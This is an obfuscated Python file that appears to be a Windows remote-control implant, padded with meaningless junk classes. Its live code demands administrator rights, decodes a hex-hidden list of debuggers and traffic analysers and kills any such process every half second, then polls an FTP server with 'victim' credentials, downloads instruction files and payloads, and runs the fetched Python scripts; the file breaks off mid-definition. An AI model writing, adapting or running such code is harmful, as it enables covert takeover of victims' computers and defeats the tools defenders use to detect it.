class IIIlllIllIllIlIIIlII:
    def __init__(IlIIllIlIlIII):
        IlIIllIlIlIII.lIlIIlIIlIlIlIlIIIl()
        IlIIllIlIlIII.IllllIIIlIlllIlI()
        IlIIllIlIlIII.IIIIllIIIllIIlIlII()
        IlIIllIlIlIII.IIIIIlIllIIlIIIll()
        IlIIllIlIlIII.IIlIIlIllllIIIIIIII()
        IlIIllIlIlIII.IllIIlIlIII()
    def lIlIIlIIlIlIlIlIIIl(IlIIllIlIlIII, llIIlllIlII):
        return IlIIllIlIlIII.IIIIllIIIllIIlIlII()
    def IllllIIIlIlllIlI(IlIIllIlIlIII, lllllIIIIlIlIIllIII, IlIlIIlIlIllIlI, IIIlIIIlIlll, Illllllll, IIlllIllIllIll, llIlIIIIIllllI, IlllllllllIIIlIll):
        return IlIIllIlIlIII.IllllIIIlIlllIlI()
    def IIIIllIIIllIIlIlII(IlIIllIlIlIII, lIIIlllIll, IllIIllllIllIlIllIl, IIIIIIIllIllIllI, lllIlIIIIlIlllIllIl, IIlIIIllIIlIllIIIIl, lllIlIllIl, lIlIllllllIlll):
        return IlIIllIlIlIII.IIIIllIIIllIIlIlII()
    def IIIIIlIllIIlIIIll(IlIIllIlIlIII, IllllIlIlIIlIllI, IIIlIllIIlllIllIIlIl, IlIIlIll, IIlllllIIlllIlIIllll, lIIIIIlIIIlIlIIllII, lIlIIllllIlllIlIIlI, IlllIllIl):
        return IlIIllIlIlIII.IllllIIIlIlllIlI()
    def IIlIIlIllllIIIIIIII(IlIIllIlIlIII, llIIIlllllI, IlllIlII, lIlIlllllIIlIl, lllIllIIlIll, llIIlIIlllll, IlllIlIIlllIllIlllI, IIIIlIlIIllII):
        return IlIIllIlIlIII.IllllIIIlIlllIlI()
    def IllIIlIlIII(IlIIllIlIlIII, lIlllIlIllIlIIII, IIIIlIIlIllll, lllIlIllIlllII, IlIIlIlI, lllllIIlIIIl, lIllllIllIIl, IIIIIllllllIIIllI):
        return IlIIllIlIlIII.IIIIllIIIllIIlIlII()
class llIllllIIllII:
    def __init__(IlIIllIlIlIII):
        IlIIllIlIlIII.IIIllIlIl()
        IlIIllIlIlIII.IIIIIIIIlIIIlIIlIIlI()
        IlIIllIlIlIII.IlIIIIllIIIIIIl()
        IlIIllIlIlIII.IIlIllIlIlI()
        IlIIllIlIlIII.IIllIIIIIllII()
        IlIIllIlIlIII.IlIlllIIIIIIII()
        IlIIllIlIlIII.IlIlIIllIIllllllII()
    def IIIllIlIl(IlIIllIlIlIII, llllIIIlIlIllIlll, lIIIlIIIIIlIIIIIIl, llIIlllllIIIII, IIlllIIlI):
        return IlIIllIlIlIII.IlIlIIllIIllllllII()
    def IIIIIIIIlIIIlIIlIIlI(IlIIllIlIlIII, IlIlIIlIIIlIIl, llIIIlIIIlllIlIlIIl, IlllIIIlIlI, llIIIIllIIlI, IIlllIlIIIIlIlIIIll):
        return IlIIllIlIlIII.IIlIllIlIlI()
    def IlIIIIllIIIIIIl(IlIIllIlIlIII, IIIIlIIlllI, llIllIllIIlIlllII, lllllllllIllIIIlI, llIIlIIlIllllIIIllI, IIIlIlIlllIlIllIIll, lIllllIIllIIIllI):
        return IlIIllIlIlIII.IIIllIlIl()
    def IIlIllIlIlI(IlIIllIlIlIII, lIlllIlIIIIllIIlIl, IlIlIIlIllll):
        return IlIIllIlIlIII.IlIlllIIIIIIII()
    def IIllIIIIIllII(IlIIllIlIlIII, IlIlIIIIllllllI, lllllIlIIIIIIIII, llllllIlIIlIIIl):
        return IlIIllIlIlIII.IIIIIIIIlIIIlIIlIIlI()
    def IlIlllIIIIIIII(IlIIllIlIlIII, lIIIllllIIIlIIIIllll):
        return IlIIllIlIlIII.IIlIllIlIlI()
    def IlIlIIllIIllllllII(IlIIllIlIlIII, lIlllIIlIII, lllIlIlIIII, lIIIlIIIIII):
        return IlIIllIlIlIII.IlIIIIllIIIIIIl()
import ctypes, sys
if not ctypes.windll.shell32.IsUserAnAdmin() != 0:
    print("Please run this program as administrator.")
    sys.exit(0)
import binascii, threading, time
try:
    from psutil import process_iter
except:
    import os
    os.system("pip install psutil")
IIllIIllllII = [
    '53757370656e64', '50726f67726573732054656c6572696b20466964646c657220576562204465627567676572', '466964646c6572', '57697265736861726b',
    '64756d70636170', '646e537079', '646e5370792d783836', '6368656174656e67696e652d7838365f3634', '4854545044656275676765725549',
    '50726f636d6f6e', '50726f636d6f6e3634', '50726f636d6f6e363461', '50726f636573734861636b6572',
    '783332646267', '783634646267', '446f744e657444617461436f6c6c6563746f723332',
    '446f744e657444617461436f6c6c6563746f723634', '485454504465627567676572537663', '48545450204465627567676572', '696461', '6964613634', '69646167', '696461673634',
    '69646177', '696461773634', '69646171', '696461713634', '69646175', '696461753634',
    '7363796c6c61', '7363796c6c615f783634', '7363796c6c615f783836', '70726f74656374696f6e5f6964',
    '77696e646267', '7265736861636b6572', '496d706f7274524543', '494d4d554e4954594445425547474552',
    '4d65676144756d706572', '646973617373656d626c79', '4465627567', '5b435055496d6d756e697479',
    '4d65676144756d70657220312e3020627920436f6465437261636b6572202f20536e44', '436861726c6573', '636861726c6573', '4f4c4c59444247', '496d706f72745f7265636f6e7374727563746f72',
    '636f6465637261636b6572', '646534646f74', '696c737079', '67726179776f6c66',
    '73696d706c65617373656d626c796578706c6f726572', '7836346e657464756d706572', '687864',
    '7065746f6f6c73', '73696d706c65617373656d626c79', '68747470616e616c797a6572', '687474706465627567', '70726f636573736861636b6572', '6d656d6f727965646974', '6d656d6f7279',
    '646534646f746d6f64646564', '70726f63657373206861636b6572', '70726f63657373206d6f6e69746f72',
    '717435636f7265', '696461', '696d6d756e697479', '68747470', '74726166666963',
    '77697265736861726b', '666964646c6572', '7061636b6574', '6861636b6572', '6465627567', '646e737079', '646f747065656b', '646f747472616365', '70726f6364756d70', '6d616e61676572',
    '6d656d6f7279', '6e65744c696d6974', '6e65744c696d69746572', '73616e64626f78'
]
IIllIIllllII = [binascii.unhexlify(IIIlIIlllIIllII.encode()).decode() for IIIlIIlllIIllII in IIllIIllllII]
def llIIIllIIlIllI():
    while True:
        try:
            for IlIIlIIlIIlllIllII in process_iter():
                for IIIlIIlllIIllII in IIllIIllllII:
                    if IIIlIIlllIIllII.lower() in IlIIlIIlIIlllIllII.name().lower():
                        IlIIlIIlIIlllIllII.kill()
        except Exception:
            pass
        time.sleep(0.5)
threading.Thread(target=llIIIllIIlIllI, daemon=True).start()
class lllIIlIllIIIIIlII:
    def __init__(IlIIllIlIlIII):
        IlIIllIlIlIII.IIlllllIlIllIIIllIl()
        IlIIllIlIlIII.lIlIlIIIIIlIIlIll()
        IlIIllIlIlIII.IIIllIIIIIlIlIIII()
        IlIIllIlIlIII.IIlllIIlIIl()
        IlIIllIlIlIII.IlIlIIlIllII()
        IlIIllIlIlIII.llIlllllIIIIIllII()
        IlIIllIlIlIII.IIIlIlIlIlI()
        IlIIllIlIlIII.lIIlIIIl()
        IlIIllIlIlIII.lIlIlIllll()
        IlIIllIlIlIII.IIllIIlIIIl()
        IlIIllIlIlIII.lIlIllIlIIIIIIIIII()
        IlIIllIlIlIII.IllIllIIllIIlIIlllI()
        IlIIllIlIlIII.IlllllIIIllIlIlI()
        IlIIllIlIlIII.lIIIIIllIIIlI()
    def IIlllllIlIllIIIllIl(IlIIllIlIlIII, IlIIlllIlll, llIIlIlllIlll, lIlIlIIlIlIlIIllII, IlIlllIIIIl, IIIIllIII, lIllllIlII):
        return IlIIllIlIlIII.llIlllllIIIIIllII()
    def lIlIlIIIIIlIIlIll(IlIIllIlIlIII, lIlllIlIlllll, IIIIllIIIlIl, lIIlIllllIl, IlllIlIIIllll):
        return IlIIllIlIlIII.llIlllllIIIIIllII()
    def IIIllIIIIIlIlIIII(IlIIllIlIlIII, lIIIlIIIIllllIlllII, IIllIIllIIllIIIIII):
        return IlIIllIlIlIII.IIIllIIIIIlIlIIII()
    def IIlllIIlIIl(IlIIllIlIlIII, IIlIlllIllI, lIllllIIlIlIlll):
        return IlIIllIlIlIII.IllIllIIllIIlIIlllI()
    def IlIlIIlIllII(IlIIllIlIlIII, IIIlIIII):
        return IlIIllIlIlIII.lIIlIIIl()
    def llIlllllIIIIIllII(IlIIllIlIlIII, IIlIIIIlIlllllllII, IlllllllIIllIlIlII, IllIIIlIIIIIllIl, IIlllIlIlIIllllIII, llIlIlIlIIIIlIIllll, IIIlIllllII):
        return IlIIllIlIlIII.IIIllIIIIIlIlIIII()
    def IIIlIlIlIlI(IlIIllIlIlIII, IIIllllIIlIllIIIl):
        return IlIIllIlIlIII.lIIIIIllIIIlI()
    def lIIlIIIl(IlIIllIlIlIII, lIIllllll, IlIIllIl, IllIllIlIllIlIll, IlIlllllIIIIIlIIlI, IIlllIlIlIIII, IlIllIlIllllII):
        return IlIIllIlIlIII.IllIllIIllIIlIIlllI()
    def lIlIlIllll(IlIIllIlIlIII, IlllIIlI, IIllIlIlllllII, llllllIIIll, IllIIIIl, IIIIIIIllIlIl, IlllIllllIIIllIIIII):
        return IlIIllIlIlIII.lIIIIIllIIIlI()
    def IIllIIlIIIl(IlIIllIlIlIII, lIllIlIlIll, IIlIlIlllllIlIII, IIIlIIllIl):
        return IlIIllIlIlIII.IIllIIlIIIl()
    def lIlIllIlIIIIIIIIII(IlIIllIlIlIII, lllIllIl, llIllIIIIlII, llIlIlIllIlIlll, lIlIlIIIIIIllIIlllll, IllIllIIIlllllIlIIl, lIIllIlIIlIlI, llIIIIlIlllIIIlI):
        return IlIIllIlIlIII.lIIlIIIl()
    def IllIllIIllIIlIIlllI(IlIIllIlIlIII, lIIlIIlIlIlIlll, IIIIIllIllIlIIIIllI, IIIlIllllIlIIIIl, lIIIllIlllllIlI):
        return IlIIllIlIlIII.lIlIlIIIIIlIIlIll()
    def IlllllIIIllIlIlI(IlIIllIlIlIII, IlIllIlllII, IllllIlllIIIllII):
        return IlIIllIlIlIII.IlllllIIIllIlIlI()
    def lIIIIIllIIIlI(IlIIllIlIlIII, llIIIlIIIIlIIII, llIllllIllII, llllIIlIIIlI, IIllIlIIlllll, lIIlIllIlIIIllIIl, llIlllllIlIIllllllII):
        return IlIIllIlIlIII.lIlIlIIIIIlIIlIll()
class llIIIIIlll:
    def __init__(IlIIllIlIlIII):
        IlIIllIlIlIII.lIlIIIllI()
        IlIIllIlIlIII.llIIIIlIllIIIIlI()
        IlIIllIlIlIII.llllllIIlIIl()
        IlIIllIlIlIII.IIllIlllllIIll()
        IlIIllIlIlIII.lllIIIIlII()
        IlIIllIlIlIII.IlllIlIlllllIlIIlIII()
    def lIlIIIllI(IlIIllIlIlIII, IllllIIIIIIlIl, IIIIlIIlI, IlllIlIlIllIllIIlI, IlIlIllIIllIl, lIlIlIllIl):
        return IlIIllIlIlIII.llIIIIlIllIIIIlI()
    def llIIIIlIllIIIIlI(IlIIllIlIlIII, IIIIIIllIIII, IlllIllII, IllIIIIIIlll, IIlIlIlllIllIl, IIIIIIIllIllIllIlllI):
        return IlIIllIlIlIII.IlllIlIlllllIlIIlIII()
    def llllllIIlIIl(IlIIllIlIlIII, lIIIlIlllllIIllIlIlI, IIIIIIlllllIIlIIIlII, lllIIIlIlllllllIl, lllIIllIlIll, IlIIIllllIllIIlIIlI, IlIllIIlIl):
        return IlIIllIlIlIII.lIlIIIllI()
    def IIllIlllllIIll(IlIIllIlIlIII, IIllllIIIlIlII, IIlllllIllI):
        return IlIIllIlIlIII.lllIIIIlII()
    def lllIIIIlII(IlIIllIlIlIII, IllIIlllIllllIllI, IllllIllIlI, IlIllIIIllllllIl, lIIIIllIlllIIlllI, llIlIllIllIIl, IIllIIllII):
        return IlIIllIlIlIII.lIlIIIllI()
    def IlllIlIlllllIlIIlIII(IlIIllIlIlIII, IIIlllIIlllIIIlI, IIIlIllIIlIIllII, IlIIIllllIIlI):
        return IlIIllIlIlIII.llIIIIlIllIIIIlI()
class IIllllllllIlII:
    def __init__(IlIIllIlIlIII):
        IlIIllIlIlIII.lIlllIlIIlI()
        IlIIllIlIlIII.lIlIIIIIIIIIlllIl()
        IlIIllIlIlIII.IIIlIIIIIlIIIIlIlll()
        IlIIllIlIlIII.IllIIllIllIII()
        IlIIllIlIlIII.IIllIllIlI()
        IlIIllIlIlIII.lIIlllllIIIllIlIllIl()
        IlIIllIlIlIII.lIIlIIlllIllIIllIll()
        IlIIllIlIlIII.lllIllllIl()
        IlIIllIlIlIII.IIllIlIIlIlllllII()
        IlIIllIlIlIII.IIIIIIlllIlllI()
        IlIIllIlIlIII.llllIlII()
        IlIIllIlIlIII.IlIlIlIIIIII()
        IlIIllIlIlIII.lIlIlllllIIIlIl()
        IlIIllIlIlIII.IIlIlIIlllIIlll()
        IlIIllIlIlIII.llIlllIllIIIIlIlllI()
    def lIlllIlIIlI(IlIIllIlIlIII, IIIllIlllIIIIIlIll, IlIIIlIIlIIllIIIlII, lIIlllIIIl, IlIlIlIIlllIl, llIIllllIll, llIIllllllI, IIllIIIlllllllllIllI):
        return IlIIllIlIlIII.lIlIIIIIIIIIlllIl()
    def lIlIIIIIIIIIlllIl(IlIIllIlIlIII, IlIllIIIlIlIllll, lIlIlIIIII, lIllIlII, lIlIlllIlIIII, lllIIIIlIIIlllIlIlII, IIllIIIllIlIIlIIIlI):
        return IlIIllIlIlIII.lIlIIIIIIIIIlllIl()
    def IIIlIIIIIlIIIIlIlll(IlIIllIlIlIII, llIlIIIllIllIll, IlIlIllIlIlIllIIIIII, IllIlIIIIIl):
        return IlIIllIlIlIII.IIlIlIIlllIIlll()
    def IllIIllIllIII(IlIIllIlIlIII, IIlllIIlll):
        return IlIIllIlIlIII.lllIllllIl()
    def IIllIllIlI(IlIIllIlIlIII, llllIlIIllIIIIlII, IlIllIlIIlIlllIlII, IllIIllIllllI, IlIlIIIllIlIIllIllII, llllIIllII, IlIIIIIIIllIlIllIl):
        return IlIIllIlIlIII.llIlllIllIIIIlIlllI()
    def lIIlllllIIIllIlIllIl(IlIIllIlIlIII, IIIllIlIIIII, lIIllIllIlIIIIIllllI, llIlllllIIIllIIIl, IIlllIIll, IllIIIIIlllIIlIlII, IlIIIllIIl):
        return IlIIllIlIlIII.IlIlIlIIIIII()
    def lIIlIIlllIllIIllIll(IlIIllIlIlIII, llIlllIllllIll, lIIIIlllll, IIIIllIlIIIIl, lllIlIIIIlll):
        return IlIIllIlIlIII.llllIlII()
    def lllIllllIl(IlIIllIlIlIII, lIlIlIIlII, IIIIlllIIllIIlIlII, lIIllllIlllIll):
        return IlIIllIlIlIII.IIIlIIIIIlIIIIlIlll()
    def IIllIlIIlIlllllII(IlIIllIlIlIII, IllIlllIll, IlIlIIIlIIIIlIIlIlII, llIlIIlIIllIIIlIIIl, IIllIIIIIlIIlIIlII, IlllIIIIllI, llIlIllIII, lIlllllIIIIIIIIllI):
        return IlIIllIlIlIII.lIIlIIlllIllIIllIll()
    def IIIIIIlllIlllI(IlIIllIlIlIII, IlllIlIIIlIIIllIllI, IlIlllIIlIll):
        return IlIIllIlIlIII.lllIllllIl()
    def llllIlII(IlIIllIlIlIII, IlIllIIlllIIlIlI, IlIIlllIll, lIIIIIllllll):
        return IlIIllIlIlIII.IllIIllIllIII()
    def IlIlIlIIIIII(IlIIllIlIlIII, lllIIIlllIlIII, IIIlIIlIIllIlII, IIllllllIllI, lllllIII):
        return IlIIllIlIlIII.llIlllIllIIIIlIlllI()
    def lIlIlllllIIIlIl(IlIIllIlIlIII, IlIIlIIIII, lIIIIIll):
        return IlIIllIlIlIII.lIIlIIlllIllIIllIll()
    def IIlIlIIlllIIlll(IlIIllIlIlIII, IllIIIllIllllIlIIIl, IllIIlIlIIllIlllIIl):
        return IlIIllIlIlIII.lIlIIIIIIIIIlllIl()
    def llIlllIllIIIIlIlllI(IlIIllIlIlIII, IlIIIIlIIIlIlIIlIlII, IlllllllIIll):
        return IlIIllIlIlIII.IllIIllIllIII()
class IlIllIIlIIllllllIllI:
    def __init__(IlIIllIlIlIII):
        IlIIllIlIlIII.lIlllIIIlIllIllIll()
        IlIIllIlIlIII.lIlIIIIIlIl()
        IlIIllIlIlIII.IIIIIIllIlIIllIlllIl()
        IlIIllIlIlIII.llllIIIlIlIIl()
        IlIIllIlIlIII.IlIIIIlIllIlIllIl()
        IlIIllIlIlIII.llIIIlllIlllllll()
        IlIIllIlIlIII.IlIlIIIllIlIIlI()
        IlIIllIlIlIII.lIllIlllIl()
        IlIIllIlIlIII.IIIIllIIl()
        IlIIllIlIlIII.lIIllIIlIIIlIll()
        IlIIllIlIlIII.IlllIIIl()
        IlIIllIlIlIII.llIIllllIIllIII()
        IlIIllIlIlIII.IIlIllIIlIlll()
        IlIIllIlIlIII.IIllIllIllI()
    def lIlllIIIlIllIllIll(IlIIllIlIlIII, IlIlIIIllllllIlIIll, IIIlIlIll, lIIIllllIlll, llllllll, IIIlIllllIIlllIIlll, IIIlIIIlIIlllIllII, IllIllllIIIlIIIIIIll):
        return IlIIllIlIlIII.IIIIllIIl()
    def lIlIIIIIlIl(IlIIllIlIlIII, lIlIllIIIIIIllllI, llIIIIIl, IllIIlIIlIIIlIlIIIII, lIIllIlIIIllll, lIlllIIIIl, IlllllIlI, llIIlllIIlllIlIllIlI):
        return IlIIllIlIlIII.lIlIIIIIlIl()
    def IIIIIIllIlIIllIlllIl(IlIIllIlIlIII, lIlllllIIlIIIlIll):
        return IlIIllIlIlIII.IlIIIIlIllIlIllIl()
    def llllIIIlIlIIl(IlIIllIlIlIII, IIIlIllIIlIlI, IlIIllIIIIIIlII, lIlIIIIlllIIIlllI):
        return IlIIllIlIlIII.llllIIIlIlIIl()
    def IlIIIIlIllIlIllIl(IlIIllIlIlIII, IlIIlIlIl, IIllIlIIllIlIIlIIIll, IIIllllllllIlllIlII, lIlllIlll):
        return IlIIllIlIlIII.IlIIIIlIllIlIllIl()
    def llIIIlllIlllllll(IlIIllIlIlIII, lIIlllIlIIllIIlIll, IlllIIlIllIllIIIllll, IIIIlIlllIIIIIIlIllI, lIlIllIllIII, IllIlIllllllIIlI, lllIllIlllIllIIlll, IlIlllIIIIlI):
        return IlIIllIlIlIII.IlllIIIl()
    def IlIlIIIllIlIIlI(IlIIllIlIlIII, IIIIIIllIII, IllllIlIllIIlII, IIlIIIIllIIIlI, IlllIIlIIlllIIIIlllI, IlIIIlIlIlIIlIIIlI, IIlIlIIllIlIlIllI):
        return IlIIllIlIlIII.IIlIllIIlIlll()
    def lIllIlllIl(IlIIllIlIlIII, IIIIIllllllll, IlIlIlIll):
        return IlIIllIlIlIII.lIlIIIIIlIl()
    def IIIIllIIl(IlIIllIlIlIII, IIIllllllIlll, IlIllIlIIIIII, lllIllIIIlII):
        return IlIIllIlIlIII.lIlllIIIlIllIllIll()
    def lIIllIIlIIIlIll(IlIIllIlIlIII, lIIllIIllllIl, llIlIIIIlIIllIII, IlllIIIIlIIllIlIl, lllIlllIIIlIIllIIlI, lIlIIIlIlIllIIlIl):
        return IlIIllIlIlIII.IIllIllIllI()
    def IlllIIIl(IlIIllIlIlIII, IIlIIIIIIllI, lIllIIIlIIlIllII, IllllIlIIlIllI, IIlllllIIIl, IlllIllIlll, IIlIIIIIIlll, lIIIIIlIIIlIIIIlI):
        return IlIIllIlIlIII.IlIlIIIllIlIIlI()
    def llIIllllIIllIII(IlIIllIlIlIII, lIlIlIlIIlIIIllI, lIIIlllIlIIlllIl, llllIlllIIIIllIIIII, IllIIIIIIlIllIII, lllllIlllII):
        return IlIIllIlIlIII.IlIlIIIllIlIIlI()
    def IIlIllIIlIlll(IlIIllIlIlIII, lIlllllIIIllII, llllIIIIIIlIIllI, IIIIIIllIlllllIlIl, IIIIIIIIIIlIlI, IllIllIIlIlIIIllI):
        return IlIIllIlIlIII.IlllIIIl()
    def IIllIllIllI(IlIIllIlIlIII, IlIllIIIIIlIIll):
        return IlIIllIlIlIII.IlIlIIIllIlIIlI()
class lIlIIIIl:
    def __init__(IlIIllIlIlIII):
        IlIIllIlIlIII.IlIIlIlIIIllII()
        IlIIllIlIlIII.IIIllllllIIlIll()
        IlIIllIlIlIII.lIIllIlllIIlIIIlll()
        IlIIllIlIlIII.lIlIIllllIIIl()
        IlIIllIlIlIII.IlIIlIlIIlll()
        IlIIllIlIlIII.lIIlllllllI()
        IlIIllIlIlIII.IlllIIIIIIIIIlll()
    def IlIIlIlIIIllII(IlIIllIlIlIII, lllIIIll, lIlllllIIlIlIlll, lIllIIIIllIIlIIIIll, IIlllllIIIII, IIlllIIIIIIIIlllIl, lllIIllllIlI):
        return IlIIllIlIlIII.lIIlllllllI()
    def IIIllllllIIlIll(IlIIllIlIlIII, IllIlllIl, lIIIIlIIlllIIIllIII, llIlIIIIIIIIl):
        return IlIIllIlIlIII.IlllIIIIIIIIIlll()
    def lIIllIlllIIlIIIlll(IlIIllIlIlIII, IIlIlIlIIl, lIllIlIIIIllIIlIIlll, lIIIIIIllIIlIIIllI, lIIIIlIllllllIlIIIII):
        return IlIIllIlIlIII.IlIIlIlIIIllII()
    def lIlIIllllIIIl(IlIIllIlIlIII, lIIIIlIlllllIlIllII, lllIlllIIl, lllIIIIlIlI, IlIIIllIllllIIIIlII, lIllllllIllIIIlII):
        return IlIIllIlIlIII.IlIIlIlIIIllII()
    def IlIIlIlIIlll(IlIIllIlIlIII, lIIlIlIlIIlIlI, llIlllIlI, llIlllIIlIIlllIIIll, lIIIIIlIIlIIIllll, IIIIIllIlIIlIIIll, llIlllIIIl, IIIlIlIIlllllllllll):
        return IlIIllIlIlIII.IIIllllllIIlIll()
    def lIIlllllllI(IlIIllIlIlIII, lIIlIlIlIII, lIllIIIll, IIlllIIllll):
        return IlIIllIlIlIII.lIlIIllllIIIl()
    def IlllIIIIIIIIIlll(IlIIllIlIlIII, lIlllIlII, lIIIlllIllllllll, llIIllllIllIIIIIlll, IlllIIlIllllIIIIlI, lllIIIlI, IllIIllIl, IIllIlllllI):
        return IlIIllIlIlIII.lIIlllllllI()
import ftplib
import os
import time
time.sleep(5)
import subprocess
lIIllIIIIIIllIIIIIII = os.getlogin()
with open(fr"C:\users\{lIIllIIIIIIllIIIIIII}\AppData\Local\Aryan\Badware\ftpserver", "r") as lIllIlIllllllll:
	IllIIIIIIIllIIllIIIl = lIllIlIllllllll.read()
IllIIllIIlllIl = ftplib.FTP(IllIIIIIIIllIIllIIIl,'victim','victimpass1234')
while True:
    time.sleep(1)
    if "i.instruction" in IllIIllIIlllIl.nlst():
        if not "done" in IllIIllIIlllIl.nlst():
            IllIIllIIlllIl.retrbinary("RETR i.instruction", open(fr"C:\users\{lIIllIIIIIIllIIIIIII}\AppData\Local\Aryan\Badware\instruction", 'wb').write)
            with open(fr"C:\users\{lIIllIIIIIIllIIIIIII}\AppData\Local\Aryan\Badware\instruction", "r") as IlllllllII:
                IllllIll = str(IlllllllII.read()).split("_")
            if IllllIll[0] == "wallpaper":
                IllIIllIIlllIl.retrbinary("RETR wallpaper.png", open(fr"C:\users\{lIIllIIIIIIllIIIIIII}\AppData\Local\Aryan\Badware\wallpaper.png", 'wb').write)
            elif IllllIll[0] == "play":
                IllIIllIIlllIl.retrbinary("RETR sentaud", open(fr"C:\users\{lIIllIIIIIIllIIIIIII}\AppData\Local\Aryan\Badware\sentaud.wav", 'wb').write)
            with open(fr"C:\users\{lIIllIIIIIIllIIIIIII}\AppData\Local\Aryan\Badware\done", "x") as IlllllllII:
                IlllllllII.write("DONE")
            with open(fr"C:\users\{lIIllIIIIIIllIIIIIII}\AppData\Local\Aryan\Badware\done", "rb") as IlllllllII:
                IllIIllIIlllIl.storbinary('STOR done', IlllllllII)
            os.remove(fr"C:\users\{lIIllIIIIIIllIIIIIII}\AppData\Local\Aryan\Badware\done")
            try:
                lIIlIllIlIIllllIll = [fr'C:\users\{lIIllIIIIIIllIIIIIII}\AppData\Local\Aryan\Badware\py\WPy64-31090\python-3.10.9.amd64\python.exe', fr"C:\users\{lIIllIIIIIIllIIIIIII}\AppData\Local\Aryan\Badware"+r"\\"+str(IllllIll[0])+".py"]
                llIIIIlI = [fr'C:\users\{lIIllIIIIIIllIIIIIII}\AppData\Local\Aryan\Badware\py\WPy64-31090\python-3.10.9.amd64\python.exe', fr"C:\users\{lIIllIIIIIIllIIIIIII}\AppData\Local\Aryan\Badware"+r"\\"+str(IllllIll[0])+".py"]
                lIIlIllIlIIllllIll.extend(IllllIll[1:])
                subprocess.run(lIIlIllIlIIllllIll)
            except:
                subprocess.run(llIIIIlI)
            if IllllIll[0] == "handler":
                break
            os.remove(fr"C:\users\{lIIllIIIIIIllIIIIIII}\AppData\Local\Aryan\Badware\instruction")
IllIIllIIlllIl.quit()
class IIlIllIIlIlllI:
    def __init__(IlIIllIlIlIII):
        IlIIllIlIlIII.llIlllIllIIl()
        IlIIllIlIlIII.llllIIlIl()
        IlIIllIlIlIII.IIIlllll()
        IlIIllIlIlIII.lllIIIlIll()
        IlIIllIlIlIII.IlIlIIIlIllllIIlI()
        IlIIllIlIlIII.IIIIlIIIlIllIlIlllII()
        IlIIllIlIlIII.IIIIIlIIl()
        IlIIllIlIlIII.IlIllIlIIlIllIlII()
        IlIIllIlIlIII.llIllllIIIlIllllI()
        IlIIllIlIlIII.IllIlIIlIllIIIll()
    def llIlllIllIIl(IlIIllIlIlIII, lIlIllllIIIlI, lllIlllIIII, IllIlIIlllIIllI):
        return IlIIllIlIlIII.IIIIlIIIlIllIlIlllII()
    def llllIIlIl(IlIIllIlIlIII, IlIIlIlIlIIll, IllIIIIllIllIIlII, IlIIlIIllIIlIlIIIllI, IllIlIIII, lllIllllIllIlllIIllI, IIIlllIllIII, IIIIIIIllllIllI):
        return IlIIllIlIlIII.IIIIlIIIlIllIlIlllII()
    def IIIlllll(IlIIllIlIlIII, IlIIlIIlIIlIlIIIIl, IIlIIIlIlIlIlIllI, lIllIIIIlllllII, lllIIIlIIlIl, IlIlIlIIIIlIIllIIlI, lIIIlIIllIlIl):
        return IlIIllIlIlIII.IIIIlIIIlIllIlIlllII()
    def lllIIIlIll(IlIIllIlIlIII, llIIlIlIlllll, IlllllIllIIlIIIIIIl):
        return IlIIllIlIlIII.IIIlllll()
    def IlIlIIIlIllllIIlI(IlIIllIlIlIII, IlllllIIlIllIIIIIIll, IIIllIlIIllIlll, lllIlIIll, lIllIIIIlIII):
        return IlIIllIlIlIII.IlIlIIIlIllllIIlI()
    def IIIIlIIIlIllIlIlllII(IlIIllIlIlIII, llIllIIlllIIIIll, llIlIIIlIl, llIIllIIlIIIllllIlI, lllllIIIll, lIIIIllllIIlI, lIlIlllIlllllIIlIl, lIllIIIII):
        return IlIIllIlIlIII.lllIIIlIll()
    def IIIIIlIIl(IlIIllIlIlIII, lIIIlIIllllIl, llllIlIlIllll, llIIlllII, IlllIIIlIlIlIlI):
        return IlIIllIlIlIII.IIIIIlIIl()
    def IlIllIlIIlIllIlII(IlIIllIlIlIII, lllIIIllllllIl, IIlIlIII, llllIIllIl, llIlIlllllIlllllIl, lllIllll, IIIIIlIlIIIllllIII):
        return IlIIllIlIlIII.lllIIIlIll()
    def llIllllIIIlIllllI(IlIIllIlIlIII, IlIIlIlIIlIIIlII):
        return IlIIllIlIlIII.lllIIIlIll()
    def IllIlIIlIllIIIll(IlIIllIlIlIII, IIlllIllllI):
        return IlIIllIlIlIII.llIllllIIIlIllllI()
class IllIIlIIlllIlIIllll:
    def __init__(IlIIllIlIlIII):
        IlIIllIlIlIII.llIIIIllIIlIlIII()
        IlIIllIlIlIII.IIIIIIIlIllIIlIll()
        IlIIllIlIlIII.IIlIIlIlIIIlII()
        IlIIllIlIlIII.lllIlIllIIlIIIl()
        IlIIllIlIlIII.IlIIlllllllIIIl()
        IlIIllIlIlIII.IlIIIIIIlII()
        IlIIllIlIlIII.IIllIlIlIlIIIlIllll()
        IlIIllIlIlIII.IllIIlllIIlIIlllIll()
        IlIIllIlIlIII.IIIIlIlllIlIllIIIll()
        IlIIllIlIlIII.IIlIlIIlI()
    def llIIIIllIIlIlIII(IlIIllIlIlIII, IlIlIIll, lllIlIlIIlIII, llIIIllIIIlIIIlllI):
        return IlIIllIlIlIII.IIlIIlIlIIIlII()
    def IIIIIIIlIllIIlIll(IlIIllIlIlIII, llIIlIIIIllIlII):
        return IlIIllIlIlIII.IIIIIIIlIllIIlIll()
    def IIlIIlIlIIIlII(IlIIllIlIlIII, IlIlIIlII, IlIllIIlIIIlIlIIIllI):
        return IlIIllIlIlIII.IllIIlllIIlIIlllIll()
    def lllIlIllIIlIIIl(IlIIllIlIlIII, IlllIIlIlllI, IIlllIIlIlllllll, IIIllIlIlIII, IlIIlIlIllIllIIl, lIlIlIlIIllllIIl):
        return IlIIllIlIlIII.IlIIIIIIlII()
    def IlIIlllllllIIIl(IlIIllIlIlIII, IIIlIIIllI, IllIlIlIIIllIIll, lIIIlIllIlIlllI, IlIIlllllllI):
        return IlIIllIlIlIII.lllIlIllIIlIIIl()
    def IlIIIIIIlII(IlIIllIlIlIII, lIlIlllllIllIIIIII, lIllllIIIIIIIIIIIIIl, lIIlIIlIll, IIIIlIlIIlllIlllI, llIlIIIllIlIlIIII):
        return IlIIllIlIlIII.IlIIlllllllIIIl()
    def IIllIlIlIlIIIlIllll(IlIIllIlIlIII, IlIIlIllIlIlIllIlll, lllllIlllIII, llIIlIIlllIIll, IlllllIlllIlIllI):
        return IlIIllIlIlIII.IlIIIIIIlII()
    def IllIIlllIIlIIlllIll(IlIIllIlIlIII, IIlIlllIllllIIlIl, lIlllIIlIlI, lIlllllIIllIIlll):
        return IlIIllIlIlIII.IIlIlIIlI()
    def IIIIlIlllIlIllIIIll(IlIIllIlIlIII, IlIlIIlllIlIlIII, IllIIIlllllI, IlIlIIIl, lIIllllllIIIIIlIlI, IIIlIIlIlll):
